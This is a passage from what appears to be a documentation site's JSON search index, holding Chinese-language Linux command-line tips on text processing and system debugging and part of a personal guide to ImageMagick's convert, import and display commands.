\u5982\u679c\u4f60\u6709\u8f93\u4e86\u4e2a\u547d\u4ee4\u884c\uff0c\u4f46\u662f\u4f60\u6539\u53d8\u6ce8\u610f\u4e86\uff0c\u4f46\u4f60\u53c8\u4e0d\u60f3\u5220\u9664\u5b83\uff0c\u56e0\u4e3a\u4f60\u8981\u5728\u5386\u53f2\u547d\u4ee4\u4e2d\u627e\u5230\u5b83\uff0c\u4f46\u4f60\u4e5f\u4e0d\u60f3\u6267\u884c\u5b83\u3002\u90a3\u4e48\uff0c\u4f60\u53ef\u4ee5\u6309\u4e0b Alt-# \uff0c\u4e8e\u662f\u8fd9\u4e2a\u547d\u4ee4\u5173\u5c31\u88ab\u52a0\u4e86\u4e00\u4e2a#\u5b57\u7b26\uff0c\u4e8e\u662f\u5c31\u88ab\u6ce8\u91ca\u6389\u4e86\u3002","title":"\u65e5\u5e38"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/#_3","text":"\u4e86\u89e3 sort \u548c uniq \u547d\u4ee4 (\u5305\u62ec uniq \u7684 -u \u548c -d \u9009\u9879). \u4e86\u89e3\u7528 cut, paste, \u548c join \u547d\u4ee4\u6765\u64cd\u4f5c\u6587\u672c\u6587\u4ef6\u3002\u5f88\u591a\u4eba\u5fd8\u4e86\u5728cut\u524d\u4f7f\u7528join\u3002 \u5982\u679c\u4f60\u77e5\u9053\u600e\u4e48\u7528sort/uniq\u6765\u505a\u96c6\u5408\u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6\u80fd\u5f88\u5927\u5730\u4fc3\u8fdb\u4f60\u7684\u5de5\u4f5c\u6548\u7387\u3002\u5047\u8bbe\u6709\u4e24\u4e2a\u6587\u672c\u6587\u4ef6a\u548cb\u5df2\u89e3\u88ab uniq\u4e86\uff0c\u90a3\u4e48\uff0c\u7528sort/uniq\u4f1a\u662f\u6700\u5feb\u7684\u65b9\u5f0f\uff0c\u65e0\u8bba\u8fd9\u4e24\u4e2a\u6587\u4ef6\u6709\u591a\u5927\uff08sort\u4e0d\u4f1a\u88ab\u5185\u5b58\u6240\u9650\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528-T\u9009\u9879\uff0c\u5982\u679c\u4f60\u7684/tmp\u76ee\u5f55\u5f88\u5c0f\uff09 cat a b | sort | uniq > c # c is a union b \u5e76\u96c6 cat a b | sort | uniq -d > c # c is a intersect b \u4ea4\u96c6 cat a b b | sort | uniq -u > c # c is set difference a - b \u5dee\u96c6 \u4e86\u89e3\u548c\u5b57\u7b26\u96c6\u76f8\u5173\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5305\u62ec\u6392\u5e8f\u548c\u6027\u80fd\u3002\u5f88\u591a\u7684Linux\u5b89\u88c5\u7a0b\u5e8f\u90fd\u4f1a\u8bbe\u7f6eLANG \u6216\u662f\u5176\u5b83\u548c\u5b57\u7b26\u96c6\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u4e9b\u4e1c\u897f\u53ef\u80fd\u4f1a\u8ba9\u4e00\u4e9b\u547d\u4ee4\uff08\u5982\uff1asort\uff09\u7684\u6267\u884c\u6027\u80fd\u6162N\u591a\u500d\uff08\u6ce8\uff1a\u5c31\u7b97\u662f\u4f60\u7528UTF-8\u7f16\u7801\u6587\u672c\u6587\u4ef6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5f88\u5b89\u5168\u5730\u4f7f\u7528ASCII\u6765\u5bf9\u5176\u6392\u5e8f\uff09\u3002\u5982\u679c\u4f60\u60f3Disable\u90a3\u4e2ai18n \u5e76\u4f7f\u7528\u4f20\u7edf\u7684\u57fa\u4e8ebyte\u7684\u6392\u5e8f\u65b9\u6cd5\uff0c\u90a3\u5c31\u8bbe\u7f6eexport LC_ALL=C \uff08\u5b9e\u9645\u4e0a\uff0c\u4f60\u53ef\u4ee5\u628a\u5176\u653e\u5728 .bashrc\uff09\u3002\u5982\u679c\u8fd9\u8bbe\u7f6e\u8fd9\u4e2a\u53d8\u91cf\uff0c\u4f60\u7684sort\u547d\u4ee4\u5f88\u6709\u53ef\u80fd\u4f1a\u662f\u9519\u7684\u3002 \u4e86\u89e3 awk \u548c sed\uff0c\u5e76\u7528\u4ed6\u4eec\u6765\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u6570\u636e\u4fee\u6539\u64cd\u4f5c\u3002\u4f8b\u5982\uff1a\u6c42\u7b2c\u4e09\u5217\u7684\u6570\u5b57\u4e4b\u548c\uff1a awk \uff07{ x += $3 } END { print x }\uff07 \u3002\u8fd9\u53ef\u80fd\u4f1a\u6bd4Python\u5feb3\u500d\uff0c\u5e76\u6bd4Python\u7684\u4ee3\u7801\u5c11\u4e09\u500d\u3002 \u4f7f\u7528 shuf \u6765\u6253\u4e71\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u884c\u6216\u662f\u9009\u62e9\u6587\u4ef6\u4e2d\u4e00\u4e2a\u968f\u673a\u7684\u884c\u3002 \u4e86\u89e3sort\u547d\u4ee4\u7684\u9009\u9879\u3002\u4e86\u89e3key\u662f\u4ec0\u4e48\uff08-t\u548c-k\uff09\u3002\u5177\u4f53\u8bf4\u6765\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528-k1,1\u6765\u5bf9\u7b2c\u4e00\u5217\u6392\u5e8f\uff0c-k1\u6765\u5bf9\u5168\u884c\u6392\u5e8f\u3002 Stable sort (sort -s) \u4f1a\u5f88\u6709\u7528\u3002\u4f8b\u5982\uff1a\u5982\u679c\u4f60\u8981\u60f3\u5bf9\u4e24\u4f8b\u6392\u5e8f\uff0c\u5148\u662f\u4ee5\u7b2c\u4e8c\u5217\uff0c\u7136\u540e\u518d\u4ee5\u7b2c\u4e00\u5217\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u8fd9\u6837\uff1a sort -k1,1 | sort -s -k2,2 \u6211\u4eec\u77e5\u9053\uff0c\u5728bash\u547d\u4ee4\u884c\u4e0b\uff0cTab\u952e\u662f\u7528\u6765\u505a\u76ee\u5f55\u6587\u4ef6\u81ea\u52a8\u5b8c\u6210\u7684\u4e8b\u7684\u3002\u4f46\u662f\u5982\u679c\u4f60\u60f3\u8f93\u5165\u4e00\u4e2aTab\u5b57\u7b26\uff08\u6bd4\u5982\uff1a\u4f60\u60f3\u5728sort -t\u9009\u9879\u540e\u8f93\u5165 <tab> \u5b57\u7b26\uff09\uff0c\u4f60\u53ef\u4ee5\u5148\u6309 Ctrl-V \uff0c\u7136\u540e\u518d\u6309Tab\u952e\uff0c\u5c31\u53ef\u4ee5\u8f93\u5165 <tab> \u5b57\u7b26\u4e86\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 $\u2019\\t\u2019 \u3002 \u5982\u679c\u4f60\u60f3\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528hd\u547d\u4ee4\uff08\u5728CentOS\u4e0b\u662fhexdump\u547d\u4ee4\uff09\uff0c\u5982\u679c\u4f60\u60f3\u7f16\u8bd1\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528bvi\u547d\u4ee4\uff08 http://bvi.sourceforge.net/ \u5899\uff09 \u53e6\u5916\uff0c\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528strings\uff08\u914d\u5408grep\u7b49\uff09\u6765\u67e5\u770b\u4e8c\u8fdb\u5236\u4e2d\u7684\u6587\u672c\u3002 \u5bf9\u4e8e\u6587\u672c\u6587\u4ef6\u8f6c\u7801\uff0c\u4f60\u53ef\u4ee5\u8bd5\u4e00\u4e0b iconv\u3002\u6216\u662f\u8bd5\u8bd5\u66f4\u5f3a\u7684 uconv \u547d\u4ee4\uff08\u8fd9\u4e2a\u547d\u4ee4\u652f\u6301\u66f4\u9ad8\u7ea7\u7684Unicode\u7f16\u7801\uff09 \u5982\u679c\u4f60\u8981\u5206\u9694\u4e00\u4e2a\u5927\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528split\u547d\u4ee4\uff08split by size\uff09\u548ccsplit\u547d\u4ee4\uff08split by a pattern\uff09\u3002","title":"\u6570\u636e\u5904\u7406"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/#_4","text":"\u5982\u679c\u4f60\u60f3\u77e5\u9053\u78c1\u76d8\u3001CPU\u3001\u6216\u7f51\u7edc\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 iostat, netstat, top (\u6216\u66f4\u597d\u7684 htop), \u8fd8\u6709 dstat \u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u5f88\u5feb\u5730\u77e5\u9053\u4f60\u7684\u7cfb\u7edf\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u3002\u5173\u4e8e\u8fd9\u65b9\u9762\u7684\u547d\u4ee4\uff0c\u8fd8\u6709iftop, iotop\u7b49\uff08\u53c2\u770b\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\uff09 \u8981\u4e86\u89e3\u5185\u5b58\u7684\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528free\u548cvmstat\u547d\u4ee4\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4f60\u9700\u8981\u6ce8\u610f \u201ccached\u201d \u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662fLinux\u5185\u6838\u5360\u7528\u7684\u5185\u5b58\u3002\u8fd8\u6709free\u7684\u503c\u3002 Java \u7cfb\u7edf\u76d1\u63a7\u6709\u4e00\u4e2a\u5c0f\u7684\u6280\u5de7\u662f\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 kill -3 <pid> \u53d1\u4e00\u4e2aSIGQUIT\u7684\u4fe1\u53f7\u7ed9JVM\uff0c\u53ef\u4ee5\u628a\u5806\u6808\u4fe1\u606f\uff08\u5305\u62ec\u5783\u573e\u56de\u6536\u7684\u4fe1\u606f\uff09dump\u5230stderr/logs\u3002 \u4f7f\u7528 mtr \u4f1a\u6bd4\u4f7f\u7528 traceroute \u8981\u66f4\u5bb9\u6613\u5b9a\u4f4d\u4e00\u4e2a\u7f51\u7edc\u95ee\u9898\u3002 \u5982\u679c\u4f60\u8981\u627e\u5230\u54ea\u4e2asocket\u6216\u8fdb\u7a0b\u5728\u4f7f\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 iftop \u6216 nethogs\u3002 Apache\u7684\u4e00\u4e2a\u53eb ab \u7684\u5de5\u5177\u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\uff0c\u7528quick-and-dirty\u7684\u65b9\u5f0f\u6765\u6d4b\u8bd5\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u6027\u80fd\u8d1f\u8f7d\u7684\u5de5\u4f5c\u3002\u5982\u679c\u4f60\u9700\u8981\u66f4\u4e3a\u590d\u6742\u7684\u6d4b\u8bd5\uff0c\u4f60\u53ef\u4ee5\u8bd5\u8bd5 siege\u3002 \u5982\u679c\u4f60\u8981\u6293\u7f51\u7edc\u5305\u7684\u8bdd\uff0c\u8bd5\u8bd5 wireshark \u6216 tshark\u3002 \u4e86\u89e3 strace \u548c ltrace\u3002\u8fd9\u4e24\u4e2a\u547d\u4ee4\u53ef\u4ee5\u8ba9\u4f60\u67e5\u770b\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u8fd9\u6709\u52a9\u4e8e\u4f60\u5206\u6790\u8fdb\u7a0b\u7684hang\u5728\u54ea\u4e86\uff0c\u600e\u4e48crash\u548cfailed\u7684\u3002\u4f60\u8fd8\u53ef\u4ee5\u7528\u5176\u6765\u505a\u6027\u80fdprofile\uff0c\u4f7f\u7528 -c \u9009\u9879\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528-p\u9009\u9879\u6765attach\u4e0a\u4efb\u610f\u4e00\u4e2a\u8fdb\u7a0b\u3002 \u4e86\u89e3\u7528ldd\u547d\u4ee4\u6765\u68c0\u67e5\u76f8\u5173\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u6ce8\u610f\uff1a ldd\u7684\u5b89\u5168\u95ee\u9898 \u4f7f\u7528gdb\u6765\u8c03\u8bd5\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u6216\u5206\u6790core dump\u6587\u4ef6\u3002\u53c2\u770b\u6211\u5199\u7684\u300a GDB\u4e2d\u5e94\u8be5\u77e5\u9053\u7684\u51e0\u4e2a\u8c03\u8bd5\u65b9\u6cd5 \u300b \u5b66\u4f1a\u5230 /proc \u76ee\u5f55\u4e2d\u67e5\u770b\u4fe1\u606f\u3002\u8fd9\u662f\u4e00\u4e2aLinux\u5185\u6838\u8fd0\u884c\u65f6\u8bb0\u5f55\u7684\u6574\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8fd0\u884c\u7edf\u8ba1\u548c\u4fe1\u606f\uff0c\u6bd4\u5982\uff1a /proc/cpuinfo, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps . \u5982\u679c\u4f60\u8c03\u8bd5\u67d0\u4e2a\u4e1c\u897f\u4e3a\u4ec0\u4e48\u51fa\u9519\u65f6\uff0c sar \u547d\u4ee4\u4f1a\u6709\u7528\u3002\u5b83\u53ef\u4ee5\u8ba9\u4f60\u770b\u770b CPU, \u5185\u5b58, \u7f51\u7edc, \u7b49\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 \u4f7f\u7528 dmesg \u6765\u67e5\u770b\u4e00\u4e9b\u786c\u4ef6\u6216\u9a71\u52a8\u7a0b\u5e8f\u7684\u4fe1\u606f\u6216\u95ee\u9898\u3002 \u4f5c\u8005\u6700\u540e\u52a0\u4e86\u4e00\u4e2a\u514d\u8d23\u58f0\u660e\uff1a Disclaimer: Just because you *can* do something in bash, doesn\u2019t necessarily mean you should. ;) \uff08\u5168\u6587\u5b8c\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://coolshell.cn/articles/8883.html","title":"\u7cfb\u7edf\u8c03\u8bd5"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/","text":"\u6211\u7684ImageMagick\u4f7f\u7528\u5fc3\u5f97 \u6587\uff1aCharry \u5728\u8ba4\u8bc6ImageMagick\u4e4b\u524d\uff0c\u6211\u4f7f\u7528\u7684\u56fe\u50cf\u6d4f\u89c8\u8f6f\u4ef6\u662fKuickShow\uff0c\u622a\u56fe\u8f6f\u4ef6\u662fKSnapShot\uff0c\u8fd9\u4e24\u6b3e\u8f6f\u4ef6\u90fd\u662fKDE\u9644\u5e26\u7684\u8f6f\u4ef6\uff0c\u7528\u8d77\u6765\u4e5f\u662f\u86ee\u65b9\u4fbf\u7684\u3002\u5728\u4e00\u6b21\u5076\u7136\u7684\u673a\u4f1a\u4e2d\uff0c\u6211\u9047\u5230\u4e86ImageMagick\uff0c\u624d\u53d1\u73b0Linux\u7adf\u7136\u6709\u5982\u6b64\u529f\u80fd\u5f3a\u5927\u7684\u56fe\u50cf\u8f6f\u4ef6\u3002 \u4f60\u5c06\u4f1a\u53d1\u73b0\uff0c\u5927\u90e8\u5206\u7684\u64cd\u4f5c\uff0c\u4f60\u53ea\u8981\u5728\u7ec8\u7aef\u4e0b\u52a8\u52a8\u952e\u76d8\u5373\u53ef\uff0c\u7701\u5f97\u4f60\u7528\u9f20\u6807\u70b9\u6765\u70b9\u53bb\u3002 \u4e0b\u9762\uff0c\u6211\u5bf9ImageMagick\u7684\u4e3b\u8981\u529f\u80fd\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u4ecb\u7ecd\uff0c\u5176\u4e2d\u8986\u76d6\u7684\u5927\u90fd\u662f\u4eba\u4eec\u5e38\u7528\u7684\u4e00\u4e9b\u529f\u80fd\uff0c\u5982\u679c\u4f60\u8981\u5168\u9762\u7684\u4e86\u89e3\u5b83\u7684\u77e5\u8bc6\uff0c\u4f60\u53ef\u4ee5\u770b\u770b\u5b83\u7684man\u624b\u518c\u3002 convert convert\u987e\u540d\u601d\u4e49\u5c31\u662f\u5bf9\u56fe\u50cf\u8fdb\u884c\u8f6c\u5316\uff0c\u5b83\u4e3b\u8981\u7528\u6765\u5bf9\u56fe\u50cf\u8fdb\u884c\u683c\u5f0f\u7684\u8f6c\u5316\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u505a\u7f29\u653e\u3001\u526a\u5207\u3001\u6a21\u7cca\u3001\u53cd\u8f6c\u7b49\u64cd\u4f5c\u3002 \u683c\u5f0f\u8f6c\u5316 \u6bd4\u5982\u628a foo.jpg \u8f6c\u5316\u4e3a foo.png\uff1a convert foo.jpg foo.png \u5982\u679c\u8981\u60f3\u628a\u76ee\u5f55\u4e0b\u6240\u6709\u7684jpg\u6587\u4ef6\u90fd\u8f6c\u5316\u4e3agif\uff0c\u6211\u4eec\u53ef\u501f\u52a9\u4e8eshell\u7684\u5f3a\u5927\u529f\u80fd\uff1a find ./ -name \"*.jpg\" -exec convert {} {}.gif \\; \u8f6c\u5316\u540e\u7684gif\u540d\u79f0\u4e3a *.jpg.gif \uff0c\u8fd9\u6837\u770b\u8d77\u6765\u4e0d\u592a\u81ea\u7136\uff0c\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6765\u4e00\u6b65\uff1a rename .jpg.gif .gif *.jpg.gif \u672c\u6765\uff0c\u6211\u60f3\u5728find\u7684\u65f6\u5019\uff0c\u7528basename\u6765\u53d6\u5f97\u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u540d\u7684\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u5f62\u6210.jpg.gif\u8fd9\u79cd\u4e11\u964b\u7684\u540d\u5b50\u4e86\uff0c\u53ef\u662f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u5c31\u662f\u4e0d\u884c\uff0c\u5982\u679c\u4f60\u77e5\u9053\u7684\u8bdd\uff0c\u544a\u8bc9\u6211 \u6216\u8005\uff0c\u4f60\u4e5f\u53ef\u7528shell script\u6765\u5b8c\u6210\u4e0a\u8ff0\u7684\u64cd\u4f5c\uff1a for i in *.jpg do convert $i `basename $i .jpg`.gif done \u6211\u4eec\u8fd8\u53ef\u7528mogrify\u6765\u5b8c\u6210\u540c\u6837\u7684\u6548\u679c\uff1a mogrify -format png *.jpg \u4e0a\u9762\u547d\u4ee4\u5c06\u4f1a\u628a\u76ee\u5f55\u4e0b\u9762\u6240\u6709\u7684jpg\u6587\u4ef6\u8f6c\u5316\u4e3apng\u683c\u5f0f\u3002 convert\u8fd8\u53ef\u4ee5\u628a\u591a\u5f20\u7167\u7247\u8f6c\u5316\u6210pdf\u683c\u5f0f\uff1a convert *.jpg foo.pdf \u5927\u5c0f\u7f29\u653e \u6bd4\u5982\u6211\u4eec\u8981\u4e3a\u4e00\u4e2a\u666e\u901a\u5927\u5c0f\u7684\u56fe\u7247\u505a\u4e00\u4e2a\u7f29\u7565\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837 convert -resize 100x100 foo.jpg thumbnail.jpg \u4f60\u4e5f\u53ef\u4ee5\u7528\u767e\u5206\u6bd4\uff0c\u8fd9\u6837\u663e\u7684\u66f4\u4e3a\u76f4\u89c2\uff1a convert -resize 50%x50% foo.jpg thumbnail.jpg convert\u4f1a\u81ea\u52a8\u5730\u8003\u8651\u5728\u7f29\u653e\u56fe\u50cf\u5927\u5c0f\u65f6\u56fe\u50cf\u7684\u9ad8\u5bbd\u7684\u6bd4\u4f8b\uff0c\u4e5f\u5c31\u662f\u8bf4\u7740\u65b0\u7684\u56fe\u50cf\u7684\u9ad8\u5bbd\u6bd4\u4e0e\u539f\u56fe\u76f8\u540c\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u6279\u91cf\u751f\u6210\u7f29\u7565\u56fe\uff1a mogrify -sample 80x60 *.jpg \u6ce8\u610f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8986\u76d6\u539f\u6765\u7684\u56fe\u7247\uff0c\u4e0d\u8fc7\u4f60\u53ef\u4ee5\u5728\u64cd\u4f5c\u524d\uff0c\u5148\u628a\u4f60\u7684\u56fe\u7247\u5907\u4efd\u4e00\u4e0b\u3002 \u52a0\u8fb9\u6846 \u5728\u4e00\u5f20\u7167\u7247\u7684\u56db\u5468\u52a0\u4e0a\u8fb9\u6846\uff0c\u53ef\u4ee5\u7528 -mattecolor \u53c2\u6570\uff0c\u6bd4\u5982\u67d0\u4f4d\u540c\u5fd7\u727a\u7272\u4e86\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u4ed6\u505a\u4e00\u5f20\u9ed1\u8fb9\u6846\u7684\u9057\u50cf\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a convert -mattecolor \"#000000\" -frame 60x60 yourname.jpg rememberyou.png \u5176\u4e2d\uff0c\"#000000\"\u662f\u8fb9\u6846\u7684\u989c\u8272\uff0c\u8fb9\u6846\u7684\u5927\u5c0f\u4e3a60x60 \u4f60\u4e5f\u53ef\u4ee5\u8fd9\u6837\u52a0\u8fb9\u6846: convert -border 60x60 -bordercolor \"#000000\" yourname.jpg rememberyou.png \u5728\u56fe\u7247\u4e0a\u52a0\u6587\u5b57 convert -fill green -pointsize 40 -draw 'text 10,50 \"charry.org\"' foo.png bar.png \u4e0a\u9762\u7684\u547d\u4ee4\u5728\u8ddd\u79bb\u56fe\u7247\u7684\u5de6\u4e0a\u89d210x50\u7684\u4f4d\u7f6e\uff0c\u7528\u7eff\u8272\u7684\u5b57\u5199\u4e0bcharry.org\uff0c\u5982\u679c\u4f60\u8981\u6307\u5b9a\u522b\u7684\u5b57\u4f53\uff0c\u53ef\u4ee5\u7528-font\u53c2\u6570\u3002 \u6a21\u7cca \u9ad8\u65af\u6a21\u7cca: convert -blur 80 foo.jpg foo.png -blur\u53c2\u6570\u8fd8\u53ef\u4ee5\u8fd9\u6837-blur 80x5\u3002\u540e\u9762\u7684\u90a3\u4e2a5\u8868\u793a\u7684\u662fSigma\u7684\u503c\uff0c\u8fd9\u4e2a\u662f\u56fe\u50cf\u672f\u8bed\uff0c\u6211\u4e5f\u4e0d\u592a\u6e05\u695a\uff0c\u603b\u4e4b\uff0c\u5b83\u7684\u503c\u5bf9\u6a21\u7cca\u7684\u6548\u679c\u8d77\u5173\u952e\u7684\u4f5c\u7528\u3002 \u7ffb\u8f6c \u4e0a\u4e0b\u7ffb\u8f6c\uff1a convert -flip foo.png bar.png \u5de6\u53f3\u7ffb\u8f6c\uff1a convert -flop foo.png bar.png \u53cd\u8272 \u5f62\u6210\u5e95\u7247\u7684\u6837\u5b50\uff1a convert -negate foo.png bar.png \u5355\u8272 \u628a\u56fe\u7247\u53d8\u4e3a\u9ed1\u767d\u989c\u8272\uff1a convert -monochrome foo.png bar.png \u52a0\u566a\u58f0 convert -noise 3 foo.png bar.png \u6cb9\u753b\u6548\u679c \u6211\u4eec\u53ef\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u628a\u4e00\u5f20\u666e\u901a\u7684\u56fe\u7247\uff0c\u53d8\u6210\u4e00\u5f20\u6cb9\u753b\uff0c\u6548\u679c\u975e\u5e38\u7684\u903c\u771f convert -paint 4 foo.png bar.png \u65cb\u8f6c \u628a\u4e00\u5f20\u56fe\u7247\uff0c\u65cb\u8f6c\u4e00\u5b9a\u7684\u89d2\u5ea6\uff1a convert -rotate 30 foo.png bar.png \u4e0a\u9762\u768430\uff0c\u8868\u793a\u5411\u53f3\u65cb\u8f6c30\u5ea6\uff0c\u5982\u679c\u8981\u5411\u5de6\u65cb\u8f6c\uff0c\u5ea6\u6570\u5c31\u662f\u8d1f\u6570\u3002 \u70ad\u7b14\u6548\u679c convert -charcoal 2 foo.png bar.png \u5f62\u6210\u70ad\u7b14\u6216\u8005\u8bf4\u662f\u94c5\u7b14\u753b\u7684\u6548\u679c\u3002 \u6563\u5c04 \u6bdb\u73bb\u7483\u6548\u679c\uff1a convert -spread 30 foo.png bar.png \u6f29\u6da1 \u4ee5\u56fe\u7247\u7684\u4e2d\u5fc3\u4f5c\u4e3a\u53c2\u7167\uff0c\u628a\u56fe\u7247\u626d\u8f6c\uff0c\u5f62\u6210\u6f29\u6da1\u7684\u6548\u679c\uff1a convert -swirl 67 foo.png bar.png \u51f8\u8d77\u6548\u679c \u7528-raise\u6765\u521b\u5efa\u51f8\u8fb9\uff1a convert -raise 5x5 foo.png bar.png \u6267\u884c\u540e\uff0c\u4f60\u4f1a\u770b\u5230\uff0c\u7167\u7247\u7684\u56db\u5468\u4f1a\u4e00\u4e2a5x5\u7684\u8fb9\uff0c\u5982\u679c\u4f60\u8981\u4e00\u4e2a\u51f9\u4e0b\u53bb\u7684\u8fb9\uff0c\u628a-raise\u6539\u4e3a+raise\u5c31\u53ef\u4ee5\u4e86\u3002\u5176\u5b9e\u51f8\u8fb9\u548c\u51f9\u8fb9\u770b\u8d77\u6765\u533a\u522b\u5e76\u4e0d\u662f\u5f88\u5927\u3002 \u5176\u4ed6 \u5176\u4ed6\u529f\u80fd\u90fd\u662f\u4e0d\u592a\u5e38\u7528\u7684\uff0c\u5982\u679c\u4f60\u611f\u5174\u8da3\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5b83\u7684\u8054\u673a\u6587\u6863 import import\u662f\u4e00\u4e2a\u7528\u4e8e\u5c4f\u5e55\u622a\u56fe\u7684\u7ec4\u4ef6\uff0c\u4e0b\u9762\u5217\u51fa\u7684\u662f\u6211\u4eec\u5e38\u7528\u7684\u529f\u80fd\uff0c\u5176\u4ed6\u7684\u529f\u80fd\uff0c\u4f60\u53c2\u8003\u5b83\u7684man\u597d\u4e86\u3002 \u622a\u53d6\u5c4f\u5e55\u7684\u4efb\u4e00\u77e9\u5f62\u533a\u57df import foo.png \u5728\u8f93\u5165\u4e0a\u8ff0\u7684\u547d\u4ee4\u540e\uff0c\u4f60\u7684\u9f20\u6807\u4f1a\u53d8\u6210\u4e00\u4e2a\u5341\u5b57\uff0c\u8fd9\u4e2a\u65f6\u5019\uff0c\u4f60\u53ea\u8981\u5728\u60f3\u8981\u622a\u53d6\u7684\u5730\u65b9\u5212\u4e00\u4e2a\u77e9\u5f62\u5c31\u53ef\u4ee5\u4e86 \u622a\u53d6\u7a0b\u5e8f\u7684\u7a97\u53e3 import -pause 3 -frame foo.png \u56de\u8f66\u540e\uff0c\u7528\u9f20\u6807\u5728\u4f60\u60f3\u622a\u7684\u7a97\u53e3\u4e0a\u70b9\u4e00\u4e0b\u5373\u53ef\u3002\u53c2\u6570-frame\u7684\u4f5c\u7528\u662f\u544a\u8bc9import\uff0c\u622a\u56fe\u7684\u65f6\u5019\u628a\u76ee\u6807\u7a97\u53e3\u7684\u5916\u6846\u67b6\u5e26\u4e0a\uff0c\u53c2\u6570-pause\u7684\u4f5c\u7528\u5f88\u91cd\u8981\uff0c\u4f60\u53ef\u4ee5\u8bd5\u7740\u628a\u5b83\u53bb\u6389\uff0c\u5bf9\u6bd4\u4e00\u4e0b\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u76ee\u6807\u7a97\u53e3\u7684\u6807\u9898\u680f\u662f\u7070\u8272\u7684\uff0cpause\u5c31\u662f\u8ba9import\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u4e0b\uff0c\u7b49\u4f60\u7684\u76ee\u6807\u7a97\u53e3\u83b7\u5f97\u7126\u70b9\u4e86\uff0c\u624d\u5f00\u59cb\u622a\u56fe\uff0c\u8fd9\u6837\u7684\u56fe\u624d\u6bd4\u8f83\u81ea\u7136\u3002 \u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3 \u5982\u679c\u60f3\u8ba9\u4f60\u7684\u622a\u56fe\u6bd4\u8f83cool\uff0c\u4f60\u53ef\u4ee5\u628a\u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3\uff0c\u65b9\u6cd5\u5982\u4e0b\uff1a import -rotate 30 -pause 3 -frame foo.png \u622a\u53d6\u6574\u4e2a\u5c4f\u5e55 import -pause 3 -window root screen.png \u6ce8\u610f\uff0c\u6682\u505c\u4e863\u79d2\u949f\uff0c\u4f60\u9700\u8981\u57283\u79d2\u949f\u5185\u5207\u6362\u5230\u9700\u8981\u622a\u53d6\u7684\u753b\u9762\u5662\u3002 display display\u5e94\u8be5\u662f\u6211\u4eec\u4f7f\u7528\u7684\u6700\u4e3a\u9891\u7e41\u7684\u56fe\u50cf\u5904\u7406\u8f6f\u4ef6\u4e86\uff0c\u6bd5\u7adf\uff0c\u8fd8\u662f\u770b\u7684\u591a \u663e\u793a\u56fe\u7247 display foo.png \u5982\u679c\u4f60\u8981\u663e\u793a\u591a\u4e2a\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 display *.png \u5e7b\u706f\u7247 display -delay 5 * \u6bcf\u96945\u4e2a\u767e\u5206\u4e4b\u79d2\u663e\u793a\u4e00\u5f20\u56fe\u7247 \u4e00\u4e9b\u5feb\u6377\u952e 1. space(\u7a7a\u683c): \u663e\u793a\u4e0b\u4e00\u5f20\u56fe\u7247 2. 